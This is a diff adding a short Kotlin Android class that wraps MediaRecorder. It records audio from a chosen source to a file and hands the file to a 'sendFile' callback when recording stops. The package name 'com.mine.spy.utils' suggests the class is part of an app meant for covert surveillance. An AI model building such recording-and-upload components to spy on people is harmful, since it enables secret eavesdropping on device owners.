@@ -1,0 +1,39 @@
+package com.mine.spy.utils
+
+import android.media.MediaRecorder
+import com.pawegio.kandroid.e
+
+/**
+ * Created by samuel incoom on 21/03/16.
+ */
+class MediaRecorderUtils(private val errorAction: () -> Unit) : MediaRecorder() {
+
+    fun startRecording(audioSource: Int,fileName:String?){
+        try {
+            setAudioSource(audioSource)
+            setOutputFormat(OutputFormat.THREE_GPP)
+            setAudioEncoder(AudioEncoder.AMR_NB)
+            setOutputFile(fileName)
+
+            val errorListener = OnErrorListener { _, _, _ -> errorAction() }
+            setOnErrorListener(errorListener)
+
+            prepare()
+            start()
+        } catch (recordingError: Throwable) {
+            e(Consts.TAG, recordingError.message.toString())
+            errorAction()
+        }
+    }
+
+    fun stopRecording(sendFile : () -> Unit){
+        try {
+            stop()
+            sendFile()
+        } catch (stopError: Throwable) {
+            e(Consts.TAG, stopError.message.toString())
+            errorAction()
+        }
+    }
+
+}
